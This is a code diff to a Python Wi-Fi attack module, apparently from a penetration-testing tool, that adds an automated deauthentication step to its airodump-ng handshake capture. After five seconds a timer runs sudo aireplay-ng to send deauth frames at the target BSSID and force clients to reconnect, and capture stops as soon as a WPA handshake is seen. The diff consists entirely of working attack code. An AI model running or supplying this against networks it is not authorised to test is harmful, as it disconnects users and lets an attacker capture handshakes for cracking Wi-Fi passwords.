@@ -1,6 +1,8 @@
 import glob
 import os
 import re
+import subprocess
+import threading
 import time
 from datetime import datetime
 from typing import Callable, Optional
@@ -12,7 +14,7 @@ from .interfaces import IAttackEngine
 
 
 class AirodumpAttack(IAttackEngine):
-    """Fallback attack via airodump-ng when hcxdumptool is unavailable."""
+    """Fallback attack via airodump-ng + aireplay-ng deauth when hcxdumptool is unavailable."""
 
     def __init__(
         self,
@@ -50,6 +52,7 @@ class AirodumpAttack(IAttackEngine):
         log_lines: list[str] = []
         handshake_found = False
         pcap_file = None
+        deauth_sent = False
 
         def _on_stdout(line: str) -> None:
             nonlocal status, handshake_found
@@ -59,10 +62,31 @@ class AirodumpAttack(IAttackEngine):
                 status = TestStatus.SUCCESS
                 handshake_found = True
                 self._log(f"[+] WPA handshake captured for {network.ssid}: {line.strip()}")
+                # Stop airodump-ng early — no need to wait full timeout
+                self._runner.terminate()
 
         def _on_stderr(line: str) -> None:
             log_lines.append(line)
             self._log(f"[!] stderr {network.ssid}: {line.strip()}")
+
+        def _send_deauth() -> None:
+            nonlocal deauth_sent
+            if handshake_found:
+                return
+            self._log(f"[*] Sending deauth to {network.ssid} ({network.bssid}) to trigger handshake")
+            try:
+                subprocess.run(
+                    ["sudo", "aireplay-ng", "-0", "5", "-a", network.bssid, self._interface],
+                    capture_output=True,
+                    timeout=20,
+                )
+                deauth_sent = True
+            except Exception as e:
+                self._log(f"[!] aireplay-ng failed: {e}")
+
+        # Schedule deauth 5s after airodump-ng starts
+        deauth_timer = threading.Timer(5.0, _send_deauth)
+        deauth_timer.start()
 
         self._log(f"[*] Запуск airodump-ng на {network.ssid} (ch {channel}, {network.bssid})")
         rc = self._runner.run(
@@ -71,6 +95,7 @@ class AirodumpAttack(IAttackEngine):
             on_stdout=_on_stdout,
             on_stderr=_on_stderr,
         )
+        deauth_timer.cancel()
 
         if rc == -1 and status != TestStatus.SUCCESS:
             status = TestStatus.TIMEOUT
